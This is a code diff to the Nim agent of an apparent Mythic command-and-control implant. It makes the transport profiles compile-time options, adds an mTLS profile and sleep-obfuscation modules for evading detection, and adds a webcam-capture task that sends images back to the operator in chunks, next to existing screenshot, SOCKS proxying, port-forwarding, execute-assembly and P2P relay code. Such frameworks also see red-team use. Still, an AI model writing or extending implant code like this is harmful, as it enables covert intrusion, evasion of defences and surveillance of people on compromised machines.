@@ -1,11 +1,18 @@
 import std/[json, random, os, base64, tables, times, strformat, asyncdispatch]
 import config
 import global_data
-import profiles/http
-import profiles/websocket
-import profiles/httpx
-import profiles/dns
-import profiles/tcp
+when defined(profile_http):
+  import profiles/http
+when defined(profile_websocket):
+  import profiles/websocket
+when defined(profile_httpx):
+  import profiles/httpx
+when defined(profile_dns):
+  import profiles/dns
+when defined(profile_tcp):
+  import profiles/tcp
+when defined(profile_mtls):
+  import profiles/mtls
 import utils/debug
 import utils/strenc
 import utils/task_processor
@@ -33,7 +40,8 @@ when defined(windows):
     import tasks/powershell as powershellTask
   when defined(cmd_link):
     import tasks/link
-  import profiles/smb
+  when defined(profile_smb):
+    import profiles/smb
   when defined(cmd_execute_assembly):
     import tasks/execute_assembly
   when defined(cmd_inline_execute):
@@ -64,6 +72,10 @@ when defined(windows):
 when defined(windows):
   when defined(sleepObfuscationEkko):
     import utils/ekko
+  when defined(sleepObfuscationFoliage):
+    import utils/foliage
+  when defined(sleepObfuscationDeathSleep):
+    import utils/death_sleep
 
 type
   BackgroundTaskType = enum
@@ -82,23 +94,40 @@ type
     mtClipboardMonitor, mtPortscan, mtDonut
   
   ProfileKind = enum
-    pkHttp, pkWebSocket, pkHttpx, pkDns, pkTcp, pkSmb
+    pkNone
+    pkHttp
+    pkWebSocket
+    pkHttpx
+    pkDns
+    pkTcp
+    pkSmb
+    pkMtls
   
   Profile = object
     case kind: ProfileKind
+    of pkNone:
+      discard
     of pkHttp:
-      httpProfile: HttpProfile
+      when defined(profile_http):
+        httpProfile: HttpProfile
     of pkWebSocket:
-      wsProfile: WebSocketProfile
+      when defined(profile_websocket):
+        wsProfile: WebSocketProfile
     of pkHttpx:
-      httpxProfile: HttpxProfile
+      when defined(profile_httpx):
+        httpxProfile: HttpxProfile
     of pkDns:
-      dnsProfile: DnsProfile
+      when defined(profile_dns):
+        dnsProfile: DnsProfile
     of pkTcp:
-      tcpProfile: TcpProfile
+      when defined(profile_tcp):
+        tcpProfile: TcpProfile
     of pkSmb:
-      when defined(windows):
+      when defined(profile_smb) and defined(windows):
         smbProfile: SmbProfile
+    of pkMtls:
+      when defined(profile_mtls):
+        mtlsProfile: MtlsProfile
   
   Agent* = ref object
     config: Config
@@ -114,93 +143,183 @@ type
 # Profile helper procs
 proc send(profile: var Profile, data: string, callbackUuid: string = ""): string =
   case profile.kind
+  of pkNone: discard
   of pkHttp:
-    result = profile.httpProfile.send(data, callbackUuid)
+    when defined(profile_http):
+      result = profile.httpProfile.send(data, callbackUuid)
+    else: discard
   of pkWebSocket:
-    result = profile.wsProfile.send(data, callbackUuid)
+    when defined(profile_websocket):
+      result = profile.wsProfile.send(data, callbackUuid)
+    else: discard
   of pkHttpx:
-    result = profile.httpxProfile.send(data, callbackUuid)
+    when defined(profile_httpx):
+      result = profile.httpxProfile.send(data, callbackUuid)
+    else: discard
   of pkDns:
-    result = profile.dnsProfile.send(data, callbackUuid)
+    when defined(profile_dns):
+      result = profile.dnsProfile.send(data, callbackUuid)
+    else: discard
   of pkTcp:
-    result = profile.tcpProfile.send(data, callbackUuid)
+    when defined(profile_tcp):
+      result = profile.tcpProfile.send(data, callbackUuid)
+    else: discard
   of pkSmb:
-    when defined(windows):
+    when defined(profile_smb) and defined(windows):
       result = profile.smbProfile.send(data, callbackUuid)
+    else: discard
+  of pkMtls:
+    when defined(profile_mtls):
+      result = profile.mtlsProfile.send(data, callbackUuid)
+    else: discard
 
 proc setAesKey(profile: var Profile, key: seq[byte]) =
   case profile.kind
+  of pkNone: discard
   of pkHttp:
-    profile.httpProfile.setAesKey(key)
+    when defined(profile_http):
+      profile.httpProfile.setAesKey(key)
+    else: discard
   of pkWebSocket:
-    profile.wsProfile.setAesKey(key)
+    when defined(profile_websocket):
+      profile.wsProfile.setAesKey(key)
+    else: discard
   of pkHttpx:
-    profile.httpxProfile.setAesKey(key)
+    when defined(profile_httpx):
+      profile.httpxProfile.setAesKey(key)
+    else: discard
   of pkDns:
-    profile.dnsProfile.setAesKey(key)
+    when defined(profile_dns):
+      profile.dnsProfile.setAesKey(key)
+    else: discard
   of pkTcp:
-    profile.tcpProfile.setAesKey(key)
+    when defined(profile_tcp):
+      profile.tcpProfile.setAesKey(key)
+    else: discard
   of pkSmb:
-    when defined(windows):
+    when defined(profile_smb) and defined(windows):
       profile.smbProfile.setAesKey(key)
+    else: discard
+  of pkMtls:
+    when defined(profile_mtls):
+      profile.mtlsProfile.setAesKey(key)
+    else: discard
 
 proc setAesDecKey(profile: var Profile, key: seq[byte]) =
   case profile.kind
+  of pkNone: discard
   of pkHttp:
-    profile.httpProfile.setAesDecKey(key)
+    when defined(profile_http):
+      profile.httpProfile.setAesDecKey(key)
+    else: discard
   of pkWebSocket:
-    profile.wsProfile.setAesDecKey(key)
+    when defined(profile_websocket):
+      profile.wsProfile.setAesDecKey(key)
+    else: discard
   of pkHttpx:
-    profile.httpxProfile.setAesDecKey(key)
+    when defined(profile_httpx):
+      profile.httpxProfile.setAesDecKey(key)
+    else: discard
   of pkDns:
-    profile.dnsProfile.setAesDecKey(key)
+    when defined(profile_dns):
+      profile.dnsProfile.setAesDecKey(key)
+    else: discard
   of pkTcp:
-    profile.tcpProfile.setAesDecKey(key)
+    when defined(profile_tcp):
+      profile.tcpProfile.setAesDecKey(key)
+    else: discard
   of pkSmb:
-    when defined(windows):
+    when defined(profile_smb) and defined(windows):
       profile.smbProfile.setAesDecKey(key)
+    else: discard
+  of pkMtls:
+    when defined(profile_mtls):
+      profile.mtlsProfile.setAesDecKey(key)
+    else: discard
 
 proc hasAesKey(profile: Profile): bool {.used.} =
   case profile.kind
+  of pkNone: discard
   of pkHttp:
-    result = profile.httpProfile.hasAesKey()
+    when defined(profile_http):
+      result = profile.httpProfile.hasAesKey()
+    else: discard
   of pkWebSocket:
-    result = profile.wsProfile.hasAesKey()
+    when defined(profile_websocket):
+      result = profile.wsProfile.hasAesKey()
+    else: discard
   of pkHttpx:
-    result = profile.httpxProfile.hasAesKey()
+    when defined(profile_httpx):
+      result = profile.httpxProfile.hasAesKey()
+    else: discard
   of pkDns:
-    result = profile.dnsProfile.hasAesKey()
+    when defined(profile_dns):
+      result = profile.dnsProfile.hasAesKey()
+    else: discard
   of pkTcp:
-    result = profile.tcpProfile.hasAesKey()
+    when defined(profile_tcp):
+      result = profile.tcpProfile.hasAesKey()
+    else: discard
   of pkSmb:
-    when defined(windows):
+    when defined(profile_smb) and defined(windows):
       result = profile.smbProfile.hasAesKey()
+    else: discard
+  of pkMtls:
+    when defined(profile_mtls):
+      result = profile.mtlsProfile.hasAesKey()
+    else: discard
 
 proc performKeyExchange(profile: var Profile): tuple[success: bool, newUuid: string] =
   case profile.kind
+  of pkNone: discard
   of pkHttp:
-    result = profile.httpProfile.performKeyExchange()
+    when defined(profile_http):
+      result = profile.httpProfile.performKeyExchange()
+    else: discard
   of pkWebSocket:
-    result = profile.wsProfile.performKeyExchange()
+    when defined(profile_websocket):
+      result = profile.wsProfile.performKeyExchange()
+    else: discard
   of pkHttpx:
-    result = profile.httpxProfile.performKeyExchange()
+    when defined(profile_httpx):
+      result = profile.httpxProfile.performKeyExchange()
+    else: discard
   of pkDns:
-    result = profile.dnsProfile.performKeyExchange()
+    when defined(profile_dns):
+      result = profile.dnsProfile.performKeyExchange()
+    else: discard
   of pkTcp:
-    result = profile.tcpProfile.performKeyExchange()
+    when defined(profile_tcp):
+      result = profile.tcpProfile.performKeyExchange()
+    else: discard
   of pkSmb:
-    when defined(windows):
+    when defined(profile_smb) and defined(windows):
       result = profile.smbProfile.performKeyExchange()
+    else: discard
+  of pkMtls:
+    when defined(profile_mtls):
+      result = profile.mtlsProfile.performKeyExchange()
+    else: discard
 
 proc cleanupConnection(agent: Agent) =
   ## Close profile connection to avoid keeping ESTABLISHED connections during sleep
   case agent.profile.kind
   of pkHttp:
-    agent.profile.httpProfile.cleanup()
+    when defined(profile_http):
+      agent.profile.httpProfile.cleanup()
+    else: discard
   of pkHttpx:
-    agent.profile.httpxProfile.cleanup()
+    when defined(profile_httpx):
+      agent.profile.httpxProfile.cleanup()
+    else: discard
   of pkWebSocket:
-    agent.profile.wsProfile.cleanup()
+    when defined(profile_websocket):
+      agent.profile.wsProfile.cleanup()
+    else: discard
+  of pkMtls:
+    when defined(profile_mtls):
+      agent.profile.mtlsProfile.cleanup()
+    else: discard
   else:
     discard  # Other profiles don't need cleanup
 
@@ -208,11 +327,21 @@ proc reconnectProfile(agent: Agent) =
   ## Recreate profile connection after cleanup
   case agent.profile.kind
   of pkHttp:
-    agent.profile.httpProfile.reconnect()
+    when defined(profile_http):
+      agent.profile.httpProfile.reconnect()
+    else: discard
   of pkHttpx:
-    agent.profile.httpxProfile.reconnect()
+    when defined(profile_httpx):
+      agent.profile.httpxProfile.reconnect()
+    else: discard
   of pkWebSocket:
-    agent.profile.wsProfile.reconnect()
+    when defined(profile_websocket):
+      agent.profile.wsProfile.reconnect()
+    else: discard
+  of pkMtls:
+    when defined(profile_mtls):
+      agent.profile.mtlsProfile.reconnect()
+    else: discard
   else:
     discard  # Other profiles don't need reconnect
 
@@ -224,28 +353,57 @@ proc newAgent*(): Agent =
   # Initialize global data storage
   initGlobalData()
   
-  debug &"[DEBUG] Agent: Initializing profile ({result.config.profile})..."
+  debugLog "agent", &"Initializing profile ({result.config.profile})..."
   
   # Initialize the correct profile based on config
   case result.config.profile
   of "websocket":
-    result.profile = Profile(kind: pkWebSocket, wsProfile: newWebSocketProfile())
+    when defined(profile_websocket):
+      result.profile = Profile(kind: pkWebSocket, wsProfile: newWebSocketProfile())
+    else:
+      debugLog "agent", "ERROR: Websocket profile not compiled in this build"
+      quit(1)
   of "httpx":
-    result.profile = Profile(kind: pkHttpx, httpxProfile: newHttpxProfile())
+    when defined(profile_httpx):
+      result.profile = Profile(kind: pkHttpx, httpxProfile: newHttpxProfile())
+    else:
+      debugLog "agent", "ERROR: Httpx profile not compiled in this build"
+      quit(1)
   of "dns":
-    result.profile = Profile(kind: pkDns, dnsProfile: newDnsProfile())
+    when defined(profile_dns):
+      result.profile = Profile(kind: pkDns, dnsProfile: newDnsProfile())
+    else:
+      debugLog "agent", "ERROR: DNS profile not compiled in this build"
+      quit(1)
   of "tcp":
-    result.profile = Profile(kind: pkTcp, tcpProfile: newTcpProfile())
+    when defined(profile_tcp):
+      result.profile = Profile(kind: pkTcp, tcpProfile: newTcpProfile())
+    else:
+      debugLog "agent", "ERROR: TCP profile not compiled in this build"
+      quit(1)
+  of "mtls":
+    when defined(profile_mtls):
+      result.profile = Profile(kind: pkMtls, mtlsProfile: newMtlsProfile())
+    else:
+      debugLog "agent", "ERROR: mTLS profile not compiled in this build"
+      quit(1)
   of "smb":
-    when defined(windows):
+    when defined(profile_smb) and defined(windows):
       result.profile = Profile(kind: pkSmb, smbProfile: newSmbProfile())
     else:
-      debug "[ERROR] SMB profile is only supported on Windows"
+      debugLog "agent", "ERROR: SMB profile is only supported on Windows"
       quit(1)
-  else:  # Default to HTTP for "http" or any other value
-    result.profile = Profile(kind: pkHttp, httpProfile: newHttpProfile())
+  of "http":
+    when defined(profile_http):
+      result.profile = Profile(kind: pkHttp, httpProfile: newHttpProfile())
+    else:
+      debugLog "agent", "ERROR: HTTP profile not compiled in this build"
+      quit(1)
+  else:
+    debugLog "agent", "ERROR: No matching profile compiled for: ", result.config.profile
+    quit(1)
   
-  debug "[DEBUG] Agent: Profile initialized successfully"
+  debugLog "agent", "Profile initialized successfully"
   
   result.callbackUuid = result.config.uuid  # Initialize with payload UUID
   result.shouldExit = false
@@ -254,7 +412,7 @@ proc newAgent*(): Agent =
   result.taskResponses = @[]
   result.backgroundTasks = initTable[string, BackgroundTaskState]()
   
-  debug "[DEBUG] Agent: Parsing AESPSK configuration..."
+  debugLog "agent", "Parsing AESPSK configuration..."
   
   # If AESPSK is configured, parse and set it
   # Note: For RSA mode, AESPSK is used temporarily for staging_rsa, then replaced by session key
@@ -272,15 +430,15 @@ proc newAgent*(): Agent =
       result.profile.setAesKey(encKeyBytes)     # for encryption
       result.profile.setAesDecKey(decKeyBytes)  # for decryption
       if result.config.encryptedExchange:
-        debug "[DEBUG] AESPSK loaded for RSA staging (will be replaced by session key after key exchange)"
+        debugLog "agent", "AESPSK loaded for RSA staging (will be replaced by session key after key exchange)"
       else:
-        debug "[DEBUG] AESPSK detected - using pre-shared AES key (no RSA exchange)"
+        debugLog "agent", "AESPSK detected - using pre-shared AES key (no RSA exchange)"
     except:
-      debug "[DEBUG] Failed to parse AESPSK: " & getCurrentExceptionMsg()
+      debugLog "agent", "Failed to parse AESPSK: " & getCurrentExceptionMsg()
   else:
-    debug "[DEBUG] Agent: No AESPSK configured"
+    debugLog "agent", "No AESPSK configured"
   
-  debug "[DEBUG] Agent: Initialization complete"
+  debugLog "agent", "Initialization complete"
 
 # Reuse buildCheckinInfo from task_processor module
 proc buildCheckinMessage(): JsonNode =
@@ -289,31 +447,31 @@ proc buildCheckinMessage(): JsonNode =
   
 proc checkin*(agent: Agent): bool =
   ## Perform initial checkin with Mythic
-  debug "[DEBUG] Starting checkin..."
+  debugLog "agent", "Starting checkin..."
   
   # Perform RSA key exchange if enabled (regardless of whether AESPSK is set)
   # AESPSK is used to encrypt the staging_rsa message, then replaced with session key
   if agent.config.encryptedExchange:
-    debug "[DEBUG] RSA key exchange enabled - performing key exchange..."
+    debugLog "agent", "RSA key exchange enabled - performing key exchange..."
     let (success, newUuid) = agent.profile.performKeyExchange()
     if not success:
-      debug "[DEBUG] Key exchange failed"
+      debugLog "agent", "Key exchange failed"
       return false
     # Update callback UUID if server provided one
     if newUuid.len > 0:
-      debug "[DEBUG] Updating callback UUID from " & agent.callbackUuid & " to " & newUuid
+      debugLog "agent", "Updating callback UUID from " & agent.callbackUuid & " to " & newUuid
       agent.callbackUuid = newUuid
   
   # Build and send checkin
   let checkinMsg = buildCheckinMessage()
   let checkinStr = $checkinMsg
   
-  debug "[DEBUG] Checkin message: " & checkinStr
+  debugLog "agent", "Checkin message: " & checkinStr
   
   let response = agent.profile.send(checkinStr, agent.callbackUuid)
   
   if response.len == 0:
-    debug "[DEBUG] Checkin failed - empty response"
+    debugLog "agent", "Checkin failed - empty response"
     return false
   
   try:
@@ -321,11 +479,11 @@ proc checkin*(agent: Agent): bool =
     if respJson.hasKey("status") and respJson["status"].getStr() == "success":
       # Update callback UUID from server response
       let newCallbackUuid = respJson["id"].getStr()
-      debug "[DEBUG] Checkin successful, updating callback UUID from " & agent.callbackUuid & " to " & newCallbackUuid
+      debugLog "agent", "Checkin successful, updating callback UUID from " & agent.callbackUuid & " to " & newCallbackUuid
       agent.callbackUuid = newCallbackUuid
       return true
   except:
-    debug "[DEBUG] Failed to parse checkin response: " & getCurrentExceptionMsg()
+    debugLog "agent", "Failed to parse checkin response: " & getCurrentExceptionMsg()
   
   return false
 
@@ -374,17 +532,17 @@ proc getTasks*(agent: Agent): tuple[tasks: seq[JsonNode], interactive: seq[JsonN
   
   if p2pDelegates.len > 0:
     getTaskingMsg[obf("delegates")] = %p2pDelegates
-    debug "[DEBUG] Including ", p2pDelegates.len, " P2P delegate(s) in get_tasking"
+    debugLog "agent", "Including ", p2pDelegates.len, " P2P delegate(s) in get_tasking"
   if p2pEdges.len > 0:
     getTaskingMsg[obf("edges")] = %p2pEdges
-    debug "[DEBUG] Including ", p2pEdges.len, " P2P edge(s) in get_tasking"
+    debugLog "agent", "Including ", p2pEdges.len, " P2P edge(s) in get_tasking"
   
-  debug "[DEBUG] Sending get_tasking with UUID: ", agent.callbackUuid
+  debugLog "agent", "Sending get_tasking with UUID: ", agent.callbackUuid
   let response = agent.profile.send($getTaskingMsg, agent.callbackUuid)
   
-  debug "[DEBUG] get_tasking response length: ", response.len, " bytes"
+  debugLog "agent", "get_tasking response length: ", response.len, " bytes"
   if response.len > 0 and response.len < 200:
-    debug "[DEBUG] get_tasking response: ", response
+    debugLog "agent", "get_tasking response: ", response
   
   if response.len == 0:
     return (@[], @[], @[], @[], @[])
@@ -400,27 +558,27 @@ proc getTasks*(agent: Agent): tuple[tasks: seq[JsonNode], interactive: seq[JsonN
     
     if respJson.hasKey(obf("tasks")):
       tasks = respJson[obf("tasks")].getElems()
-      debug "[DEBUG] Received " & $tasks.len & " task(s)"
+      debugLog "agent", "Received " & $tasks.len & " task(s)"
     
     if respJson.hasKey(obf("interactive")):
       interactive = respJson[obf("interactive")].getElems()
-      debug "[DEBUG] Received " & $interactive.len & " interactive message(s)"
+      debugLog "agent", "Received " & $interactive.len & " interactive message(s)"
     
     if respJson.hasKey(obf("socks")):
       socks = respJson[obf("socks")].getElems()
-      debug "[DEBUG] Received " & $socks.len & " socks message(s)"
+      debugLog "agent", "Received " & $socks.len & " socks message(s)"
     
     if respJson.hasKey(obf("rpfwd")):
       rpfwd = respJson[obf("rpfwd")].getElems()
-      debug "[DEBUG] Received " & $rpfwd.len & " rpfwd message(s)"
+      debugLog "agent", "Received " & $rpfwd.len & " rpfwd message(s)"
     
     if respJson.hasKey(obf("delegates")):
       delegates = respJson[obf("delegates")].getElems()
-      debug "[DEBUG] Received " & $delegates.len & " delegate message(s)"
+      debugLog "agent", "Received " & $delegates.len & " delegate message(s)"
     
     return (tasks, interactive, socks, rpfwd, delegates)
   except:
-    debug "[DEBUG] Failed to parse tasking: " & getCurrentExceptionMsg()
+    debugLog "agent", "Failed to parse tasking: " & getCurrentExceptionMsg()
     return (@[], @[], @[], @[], @[])
 
 
@@ -430,7 +588,7 @@ proc processInteractive*(agent: var Agent, interactive: seq[JsonNode]) =
   when defined(cmd_pty):
     for msg in interactive:
       let taskId = msg[obf("task_id")].getStr()
-      debug "[DEBUG] Processing interactive message for task " & taskId
+      debugLog "agent", "Processing interactive message for task " & taskId
       
       # Create array with single message for handler
       let response = handlePtyInteractive(taskId, @[msg])
@@ -443,7 +601,7 @@ proc processSocks*(agent: var Agent, socksMessages: seq[JsonNode]) =
   ## Process SOCKS messages (data forwarding from Mythic)
   when defined(cmd_socks):
     if socksMessages.len > 0:
-      debug "[DEBUG] Processing " & $socksMessages.len & " SOCKS message(s)"
+      debugLog "agent", "Processing " & $socksMessages.len & " SOCKS message(s)"
       
       # Handle all SOCKS messages and get responses to send back
       let responses = handleSocksMessages(socksMessages)
@@ -457,7 +615,7 @@ proc processRpfwd*(agent: var Agent, rpfwdMessages: seq[JsonNode]) =
   ## Process RPfwd messages (data forwarding from Mythic)
   when defined(cmd_rpfwd):
     if rpfwdMessages.len > 0:
-      debug "[DEBUG] Processing " & $rpfwdMessages.len & " rpfwd message(s)"
+      debugLog "agent", "Processing " & $rpfwdMessages.len & " rpfwd message(s)"
       
       # Handle all RPfwd messages and get responses to send back
       let responses = handleRpfwdMessages(rpfwdMessages)
@@ -471,14 +629,14 @@ proc processDelegates*(agent: var Agent, delegates: seq[JsonNode]) =
   ## Process delegate messages (P2P agent communications)
   ## Delegates are messages from Mythic that need to be forwarded to linked P2P agents
   if delegates.len > 0:
-    debug "[DEBUG] Processing " & $delegates.len & " delegate message(s)"
+    debugLog "agent", "Processing " & $delegates.len & " delegate message(s)"
     
     # Forward delegates to appropriate linked agents via their connection
     for delegate in delegates:
       if delegate.hasKey(obf("uuid")) and delegate.hasKey(obf("message")):
         let uuid = delegate[obf("uuid")].getStr()
         let message = delegate[obf("message")].getStr()
-        debug "[DEBUG] Delegate message for linked agent: ", uuid
+        debugLog "agent", "Delegate message for linked agent: ", uuid
         
         # Try to forward to connect connection (TCP)
         when defined(cmd_connect):
@@ -486,15 +644,15 @@ proc processDelegates*(agent: var Agent, delegates: seq[JsonNode]) =
             # Try to forward to link connection (SMB - Windows only)
             when defined(cmd_link) and defined(windows):
               if not forwardDelegateToLink(uuid, message):
-                debug "[DEBUG] Failed to forward delegate to agent ", uuid, " - no active connection"
+                debugLog "agent", "Failed to forward delegate to agent ", uuid, " - no active connection"
             else:
-              debug "[DEBUG] Failed to forward delegate to agent ", uuid, " - no active connection"
+              debugLog "agent", "Failed to forward delegate to agent ", uuid, " - no active connection"
         else:
           when defined(cmd_link) and defined(windows):
             if not forwardDelegateToLink(uuid, message):
-              debug "[DEBUG] Failed to forward delegate to agent ", uuid, " - no active connection"
+              debugLog "agent", "Failed to forward delegate to agent ", uuid, " - no active connection"
           else:
-            debug "[DEBUG] Failed to forward delegate to agent ", uuid, " - no active connection"
+            debugLog "agent", "Failed to forward delegate to agent ", uuid, " - no active connection"
         
         # Handle UUID re-keying (Mythic assigns new UUID after checkin)
         if delegate.hasKey(obf("new_uuid")) or delegate.hasKey(obf("mythic_uuid")):
@@ -504,13 +662,13 @@ proc processDelegates*(agent: var Agent, delegates: seq[JsonNode]) =
             delegate[obf("mythic_uuid")].getStr()
           
           if newUuid != uuid:
-            debug "[DEBUG] Mythic assigned new UUID via get_tasking: ", newUuid, " (old: ", uuid, ")"
+            debugLog "agent", "Mythic assigned new UUID via get_tasking: ", newUuid, " (old: ", uuid, ")"
             when defined(cmd_connect):
               discard rekeyConnectConnection(uuid, newUuid)
             when defined(cmd_link) and defined(windows):
               discard rekeyLinkConnection(uuid, newUuid)
       else:
-        debug "[DEBUG] Malformed delegate message - missing uuid or message"
+        debugLog "agent", "Malformed delegate message - missing uuid or message"
 
 proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
   ## Process received tasks using the unified task_processor
@@ -521,7 +679,7 @@ proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
     # Check if this is a background task response (download/upload continuation)
     # These are forwarded to background threads in postResponses(), so skip here
     if command == obf("background_task"):
-      debug "[DEBUG] Background task message (will be forwarded in postResponses): " & taskId
+      debugLog "agent", "Background task message (will be forwarded in postResponses): " & taskId
       continue
     
     # Parse parameters - Mythic sends it as a JSON string
@@ -532,7 +690,7 @@ proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
         try:
           params = parseJson(paramStr)
         except:
-          debug "[DEBUG] Failed to parse parameters: " & paramStr
+          debugLog "agent", "Failed to parse parameters: " & paramStr
     
     # Execute task using unified task_processor
     let execResult = executeTask(taskId, command, params)
@@ -708,8 +866,35 @@ proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
       
       of obf("screenshot"):
         when defined(cmd_screenshot) and defined(windows):
-          # Screenshot doesn't use BackgroundTaskState, handled elsewhere
-          discard
+          # Screenshot uses btDownload with in-memory fileData for chunked transfer
+          if execResult.response.hasKey(obf("screenshot_data")):
+            let screenshotB64 = execResult.response[obf("screenshot_data")].getStr()
+            let screenshotBytes = cast[seq[byte]](decode(screenshotB64))
+            var state = BackgroundTaskState(
+              taskType: btDownload,
+              path: "",
+              fileId: "",
+              totalChunks: execResult.response[obf("download")][obf("total_chunks")].getInt(),
+              currentChunk: 0,
+              fileData: screenshotBytes
+            )
+            agent.backgroundTasks[taskId] = state
+      
+      of obf("webcam_snap"):
+        when defined(cmd_webcam_snap) and defined(windows):
+          # webcam_snap uses same btDownload pattern as screenshot
+          if execResult.response.hasKey(obf("screenshot_data")):
+            let snapB64 = execResult.response[obf("screenshot_data")].getStr()
+            let snapBytes = cast[seq[byte]](decode(snapB64))
+            var state = BackgroundTaskState(
+              taskType: btDownload,
+              path: "",
+              fileId: "",
+              totalChunks: execResult.response[obf("download")][obf("total_chunks")].getInt(),
+              currentChunk: 0,
+              fileData: snapBytes
+            )
+            agent.backgroundTasks[taskId] = state
       
       of obf("powershell_import"):
         when defined(cmd_powershell_import) and defined(windows):
@@ -800,8 +985,8 @@ proc postResponses*(agent: var Agent) =
   if agent.taskResponses.len == 0:
     return
   
-  debug "[DEBUG] === POSTING RESPONSES ==="
-  debug "[DEBUG] Posting ", agent.taskResponses.len, " response(s)"
+  debugLog "agent", "=== POSTING RESPONSES ==="
+  debugLog "agent", "Posting ", agent.taskResponses.len, " response(s)"
   
   # Separate interactive, socks, rpfwd, delegate, and edge messages from regular responses
   var regularResponses: seq[JsonNode] = @[]
@@ -858,7 +1043,13 @@ proc postResponses*(agent: var Agent) =
         cleanResp.delete(obf("edges"))
         regularResponses.add(cleanResp)
     else:
-      regularResponses.add(resp)
+      # Strip internal fields that shouldn't be sent to Mythic
+      if resp.hasKey(obf("screenshot_data")):
+        var cleanResp = resp.copy()
+        cleanResp.delete(obf("screenshot_data"))
+        regularResponses.add(cleanResp)
+      else:
+        regularResponses.add(resp)
   
   # Build post_response message
   var postMsg = %*{
@@ -881,16 +1072,16 @@ proc postResponses*(agent: var Agent) =
   # Add delegate messages at top level if any
   if delegateMessages.len > 0:
     postMsg[obf("delegates")] = %delegateMessages
-    debug "[DEBUG] Sending ", delegateMessages.len, " delegate message(s) to Mythic"
+    debugLog "agent", "Sending ", delegateMessages.len, " delegate message(s) to Mythic"
   
   # Add edge messages at top level if any
   if edgeMessages.len > 0:
     postMsg[obf("edges")] = %edgeMessages
-    debug "[DEBUG] Sending ", edgeMessages.len, " edge message(s) to Mythic"
+    debugLog "agent", "Sending ", edgeMessages.len, " edge message(s) to Mythic"
   
   let response = agent.profile.send($postMsg, agent.callbackUuid)
   
-  debug "[DEBUG] Responses posted successfully"
+  debugLog "agent", "Responses posted successfully"
   
   agent.taskResponses = @[]
   
@@ -906,7 +1097,7 @@ proc postResponses*(agent: var Agent) =
           try:
             let delegateUuid = delegate[obf("uuid")].getStr()
             let delegateMessage = delegate[obf("message")].getStr()
-            debug "[DEBUG] Received delegate for ", delegateUuid, " (", delegateMessage.len, " bytes base64)"
+            debugLog "agent", "Received delegate for ", delegateUuid, " (", delegateMessage.len, " bytes base64)"
             
             # Forward delegate message to the P2P agent FIRST (using old UUID)
             when defined(cmd_connect):
@@ -922,15 +1113,15 @@ proc postResponses*(agent: var Agent) =
                 delegate[obf("mythic_uuid")].getStr()
               
               if newUuid != delegateUuid:
-                debug "[DEBUG] Mythic assigned new UUID: ", newUuid, " (old: ", delegateUuid, ")"
-                debug "[DEBUG] Re-keying connection for future messages"
+                debugLog "agent", "Mythic assigned new UUID: ", newUuid, " (old: ", delegateUuid, ")"
+                debugLog "agent", "Re-keying connection for future messages"
                 # Re-key the connection from old UUID to new UUID for future messages
                 when defined(cmd_connect):
                   discard rekeyConnectConnection(delegateUuid, newUuid)
                 when defined(cmd_link) and defined(windows):
                   discard rekeyLinkConnection(delegateUuid, newUuid)
           except:
-            debug "[DEBUG] Failed to forward delegate: ", getCurrentExceptionMsg()
+            debugLog "agent", "Failed to forward delegate: ", getCurrentExceptionMsg()
       
       if respJson.hasKey(obf("responses")):
         for taskResp in respJson[obf("responses")]:
@@ -947,20 +1138,21 @@ proc postResponses*(agent: var Agent) =
                 if state.fileId.len == 0 and taskResp.hasKey(obf("file_id")):
                   state.fileId = taskResp[obf("file_id")].getStr()
                   agent.backgroundTasks[taskId] = state
-                  debug "[DEBUG] Download got file_id: ", state.fileId
+                  debugLog "agent", "Download got file_id: ", state.fileId
                 
                 # Send next chunk
                 if state.currentChunk < state.totalChunks:
                   state.currentChunk += 1
                   
-                  # Differentiate between file download and screenshot (in-memory data)
+                  # Differentiate between file download and screenshot/webcam (in-memory data)
                   let chunkResp = if state.fileData.len > 0:
-                    # Screenshot - process from memory (Windows only)
+                    # In-memory data (screenshot or webcam_snap) - process from memory (Windows only)
                     when defined(cmd_screenshot) and defined(windows):
                       processScreenshotChunk(taskId, state.fileId, state.fileData, state.currentChunk)
+                    elif defined(cmd_webcam_snap) and defined(windows):
+                      processWebcamSnapChunk(taskId, state.fileId, state.fileData, state.currentChunk)
                     else:
-                      # Should never happen on non-Windows, but return error
-                      %*{obf("task_id"): taskId, obf("completed"): true, obf("status"): "error", obf("user_output"): obf("Screenshot not supported")}
+                      %*{obf("task_id"): taskId, obf("completed"): true, obf("status"): "error", obf("user_output"): obf("In-memory transfer not supported")}
                   else:
                     # File download - read from disk
                     processDownloadChunk(taskId, state.fileId, state.path, state.currentChunk)
@@ -970,18 +1162,20 @@ proc postResponses*(agent: var Agent) =
                   # Check if this was the last chunk
                   if state.currentChunk >= state.totalChunks:
                     let completeMsg = if state.fileData.len > 0:
-                      # Screenshot complete (Windows only)
+                      # In-memory transfer complete (Windows only)
                       when defined(cmd_screenshot) and defined(windows):
                         completeScreenshot(taskId, state.fileId)
+                      elif defined(cmd_webcam_snap) and defined(windows):
+                        completeWebcamSnap(taskId, state.fileId)
                       else:
-                        %*{obf("task_id"): taskId, obf("completed"): true, obf("status"): "error", obf("user_output"): obf("Screenshot not supported")}
+                        %*{obf("task_id"): taskId, obf("completed"): true, obf("status"): "error", obf("user_output"): obf("In-memory transfer not supported")}
                     else:
                       # File download complete
                       completeDownload(taskId, state.fileId, state.path)
                     
                     agent.taskResponses.add(completeMsg)
                     agent.backgroundTasks.del(taskId)
-                    debug "[DEBUG] ", (if state.fileData.len > 0: "Screenshot" else: "Download"), " complete"
+                    debugLog "agent", "", (if state.fileData.len > 0: "In-memory transfer" else: "Download"), " complete"
                   else:
                     agent.backgroundTasks[taskId] = state
             
@@ -1000,7 +1194,7 @@ proc postResponses*(agent: var Agent) =
                   
                   if uploadResp.hasKey(obf("completed")) and uploadResp[obf("completed")].getBool():
                     agent.backgroundTasks.del(taskId)
-                    debug "[DEBUG] Upload complete"
+                    debugLog "agent", "Upload complete"
                   else:
                     state.currentChunk += 1
                     agent.backgroundTasks[taskId] = state
@@ -1022,7 +1216,7 @@ proc postResponses*(agent: var Agent) =
                   
                   if execResp.hasKey(obf("completed")) and execResp[obf("completed")].getBool():
                     agent.backgroundTasks.del(taskId)
-                    debug "[DEBUG] Execute-assembly complete"
+                    debugLog "agent", "Execute-assembly complete"
                   else:
                     state.currentChunk += 1
                     agent.backgroundTasks[taskId] = state
@@ -1043,9 +1237,15 @@ proc postResponses*(agent: var Agent) =
